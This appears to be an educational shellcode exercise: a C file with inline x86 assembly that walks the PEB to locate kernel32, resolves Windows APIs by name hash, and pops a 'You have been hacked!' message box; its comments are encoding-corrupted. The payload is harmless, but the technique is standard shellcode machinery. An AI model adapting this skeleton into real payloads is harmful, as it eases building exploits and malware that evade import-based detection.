int main()
{
	__asm
	{
// ==== ����Ҫ���õĺ�����hashֵ��ջ ====
		cld							//�����־λDF
		push	0x1e380a6a			//MessageBoxA��hashֵ
		push	0x4fd18963			//ExitProcess��hashֵ
		push	0x0c917432			//LoadLibraryA��hashֵ
		mov		esi,esp				//esi�������ջ����һ����������LoadLibraryA��hashֵ
		lea		edi,[esi-0xc]
// ==== ����һЩ�C�ռ� ====
		xor		ebx,ebx				//��ebx����
		mov		bh,0x04				//��ʱebxΪ0x400
		sub		esp,ebx				//����0x400��С�Ŀռ�
// ==== ѹ��"user32.dll" ====
		mov		bx,0x3233
		push	ebx					//ѹ���ַ�"32"
		push 	0x72657375			//ѹ���ַ�"user"
		push	esp
		xor 	edx,edx				//��edx����
// ==== ����kernel32.dll�Ļ���ַ ====
		mov		ebx,fs:[edx+0x30]  // [TEB+0x30]��PEB��λ��
		mov		ecx,[ebx+0xC]    // [PEB+0xC]��PEB_LDR_DATA��λ��
		mov		ecx,[ecx+0x1C]   // [PEB_LDR_DATA+0x1C]��InInitializationOrderModuleList��λ��
		mov		ecx,[ecx]        // ���������һ������ntdll.dll
		mov		ebp,[ecx+0x8]     // ebp�������kernel32.dll�Ļ���ַ
		
	find_lib_funtions:
		lodsd
		cmp		eax,0x1e380a6a		//��MessageBoxA��hashֵ���бȽ�
		jne		find_functions		//�������ȣ����������
		xchg	eax,ebp
		call	[edi-0x8]
		xchg	eax,ebp

// ==== ��PE�ļ��в�����Ӧ��API���� ====   
	find_functions:
		pushad                      // �������мĴ����е�����
		mov  eax,[ebp+0x3C]  // PEͷ
		mov  ecx,[ebp+eax+0x78] // �������ָ��
		add  ecx,ebp    
		mov  ebx,[ecx+0x20]  // ���������������б�
		add  ebx,ebp             
		xor  edi,edi             // ���edi�е����ݣ���������
// ==== ѭ����ȡ�������� ====   
	next_function_loop:
		inc  edi                 // edi������������Ϊ����
		mov     esi,[ebx+edi*4]     // ���б������ж�ȡ
		add  esi,ebp       // esi������Ǻ����������ڵ�ַ
		cdq                         // ��edx��ÿһλ�ó�eax�����λ���ٰ�edx��չΪeax�ĸ�λ������Ϊ64λ	

// ==== hashֵ�ļ��� ====
	hash_loop:
		movsx eax,byte ptr[esi]   // ÿ��ȡ��һ���ַ�����eax��
		cmp  al,ah            // ��֤eax�Ƿ�Ϊ0x0����������
		jz  compare_hash    // ����������Ϊ�㣬˵��hashֵ������ϣ������hashֵ�ıȽ�
		ror     edx,7               // ���cmp�Ľ����Ϊ�㣬�����ѭ������7λ�Ĳ���
		add  edx,eax             // ��ѭ�����Ƶ�ֵ�����ۼ�
		inc  esi                 // esi���������ڶ�ȡ��һ���ַ�
		jmp  hash_loop           // ����hash_loop��λ�ü�������
// ==== hashֵ�ıȽ� ====
	compare_hash:
		cmp 	edx,[esp+0x1c]
		jnz		next_function_loop
		mov		ebx,[ecx+0x24]
		add		ebx,ebp
		mov		di,[ebx+2*edi]
		mov		ebx,[ecx+0x1c]
		add		ebx,ebp
		add		ebp,[ebx+4*edi]
		xchg	eax,ebp
		pop		edi
		stosd
		push	edi
		popad
		cmp		eax,0x1e380a6a
		jne		find_lib_funtions
		
// ==== hashֵ�ıȽ� ====
	funtion_call:
	sub esp,0x50
	xor ebx,ebx
	push ebx     // cut string
	push 0x20676e69   
	push 0x6e726157    // push "Warning"
	mov eax,esp
	push ebx             // cut string  
	push 0x2020292e
	push 0x592e4a20
	push 0x79622821
	push 0x64656b63
	push 0x6168206e
	push 0x65656220
	push 0x65766168
	push 0x20756f59    // push "You have been hacked!(by J.Y.)"
	mov ecx,esp
	push ebx
	push eax
	push ecx
	push ebx
	call [edi-0x04]           // call MessageBox
	push ebx
	call [edi-0x08]            // call ExitProcess
	}
}